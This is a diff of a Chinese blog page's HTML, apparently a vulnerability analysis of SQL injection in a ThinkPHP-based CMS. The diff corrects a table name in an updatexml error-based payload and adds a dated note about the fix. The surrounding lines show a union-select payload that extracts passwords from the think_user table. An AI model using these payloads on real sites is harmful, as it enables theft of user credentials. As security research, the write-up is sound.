@@ -252,7 +252,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CMS/" style="color: #00a596">CMS</a>
+                <a href="/blog/tags/CMS/" style="color: #ffa2c4">CMS</a>
             </span>
             
         </span>
@@ -692,7 +692,7 @@ W 快速Widget输出方法<span aria-hidden="true" class="line-numbers-rows"><sp
     <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> think_user <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在<code>$data</code>处下个断点</p>
 <p>简单在id处传入一个<code>id=1&#39;</code></p>
@@ -760,7 +760,7 @@ W 快速Widget输出方法<span aria-hidden="true" class="line-numbers-rows"><sp
 <p>所以注入的payload：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token punctuation">[</span>where<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>本地复现不出上面报错注入的payload，不知道为什么</p>
+<p>本地复现不出上面报错注入的payload，不知道为什么（24&#x2F;07&#x2F;19更新：注意查询的表名，应该是<code>think_user</code>，已更正）</p>
 <p>不过可以联合注入</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span>id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> think_user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
